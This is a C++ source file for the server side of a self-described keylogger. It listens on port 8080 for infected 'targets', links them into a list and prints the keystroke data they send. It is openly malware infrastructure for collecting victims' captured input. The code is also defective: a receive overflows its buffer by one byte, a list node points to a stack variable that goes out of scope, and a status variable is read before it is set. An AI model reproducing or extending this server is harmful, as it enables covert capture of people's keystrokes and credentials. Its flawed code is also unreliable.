#include <winsock2.h>
#include <mswsock.h>
#include "ServerInterProcess.h"
#include <stdio.h>
#include <thread>
#include<mutex>
#include <fcntl.h>
#include <io.h>

std::mutex mu;
SOCKETLIST slist;

void Listener()
{
    WSADATA WSA;
    SOCKET Listener, acceptedTarget;
    SOCKADDR_IN server, target;
    slist.nextTarget=0x00;
    slist.target=0x00;
    int cL;
    char* buffer = (char*)malloc(0x1000);
    fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
    fprintf(stderr ,"\t[*] Initalizing socket...\n");
    if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
    {
        fprintf(stderr ,"\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
        return;
    }
    fprintf(stderr ,"\t\t[*] WSA startup complete!\n\t[*] creating socket!");
    if((Listener = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
    {
        fprintf(stderr ,"Error in creating socket, error code: %d", WSAGetLastError());
        return;
    }
    server.sin_family =AF_INET;
    server.sin_addr.S_un.S_addr = INADDR_ANY;
    server.sin_port=htons(8080);
    fprintf(stderr ,"\n\t\t[*] attempting to bind socket to port 8080: ");
    if(bind(Listener,(struct sockaddr*)&server,sizeof(server))== SOCKET_ERROR)
    {
        fprintf(stderr ,"failed to bind socket, Error code %d", WSAGetLastError());
        return;
    }

    listen(Listener,3);
    cL=sizeof(target);
    while(true)
    {
        fprintf(stderr, "accepted\n\t\t[*]Listening: ");
        acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
        SOCKETLIST link;

        if(acceptedTarget==INVALID_SOCKET)
        {
            fprintf(stderr ,"\n\t\t[*] error connecting");
        }
        else
        {
            fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
            u_long mode =1;
            ioctlsocket(acceptedTarget,FIONBIO,&mode);
            link.target = acceptedTarget;

            mu.lock();
            /*
                establish a self referential linked list,
                    A->B->C->A...
                each link contains a socket so the listener thread can read data off of the
                socket.
            */
            if(slist.target==0x00)
            {
                slist=link;
                slist.nextTarget=&slist;
            }
            else
            {
                link.nextTarget=slist.nextTarget;
                slist.nextTarget=&link;
            }
            mu.unlock();
            unsigned int rcv;
            while(recv(acceptedTarget,buffer,0x1001,0) !=  SOCKET_ERROR || (rcv =WSAGetLastError()) == WSAEWOULDBLOCK)
            {
                if (rcv != WSAEWOULDBLOCK)
                {
                    *(buffer+0x1000)=0x00;
                    printf("%s",buffer);
                }
                WSASetLastError(0x00);
                rcv = 0x00;
            }
            printf("Error: %d", WSAGetLastError());
            printf("\n</KeyLoggerMetaData>\n");
        }

    }
    closesocket(acceptedTarget);
    WSACleanup();
}
/**
    this is a temporary server used for testing, future changes will be established
*/
int main()
{
    std::thread thread1 (Listener);

    thread1.join();

    return 0;
}
